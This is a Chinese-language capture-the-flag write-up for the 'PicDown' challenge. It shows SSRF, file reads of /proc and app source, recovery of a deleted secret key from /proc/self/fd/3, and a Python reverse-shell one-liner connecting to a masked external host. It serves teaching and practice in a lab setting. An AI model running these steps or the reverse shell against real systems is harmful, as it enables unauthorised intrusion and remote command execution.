# \[网鼎杯 2020 白虎组]PicDown

## \[网鼎杯 2020 白虎组]PicDown

## 考点

* SSRF
* 任意文件读取
* Flask代码审计

## wp

除了一个框啥都没有，F12看到了请求的参数`/page?url=`

![](<../../.gitbook/assets/image (16) (1) (1) (1).png>)

一开始以为PicDown是下载图片，试了一下发现就是SSRF

![](<../../.gitbook/assets/image (18) (1) (1) (1) (1).png>)

尝试目录穿越文件读取，最后有个app用户

![](<../../.gitbook/assets/image (20) (1) (1) (1) (1).png>)

尝试读取flag，发现可以直接读`http://b7ce4ee5-2c98-41db-beae-1955d540e6bf.node4.buuoj.cn:81/page?url=/flag`访问得到一个图片，应该是非预期了。

![](<../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png>)

读取`/proc/self/cmdline`文件，得到`python2 app.py`

访问`/proc/self/environ`得到如下

```
MAIL=/var/mail/app
USER=app
HOME=/home/app
LOGNAME=app
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SHELL=/bin/sh
PWD=/app
```

访问`app.py`，直接访问?url=app.py

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

可以看到`app.py`在读取`/tmp/secret.txt`后把它删除，然后我们要在`/no_one_know_the_manager`传递一个和`secret.txt`内容相同的字符串才能getshell。虽然它删除了文件，但是是有读取缓存的，在`/proc/pid/fd/`中，一个一个试不难试出来在`/proc/self/fd/3`

![](<../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (6) (1) (1) (1) (1).png>)

由于无回显，这又是用的python2，所以直接用python反弹shell即可

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("****",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](<../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png>)

## 小结

1. 在读取文件时，可以考虑的文件`/proc/self/cmdline`，`/proc/self/environ`，`/proc/cmdline`，`/etc/hosts`
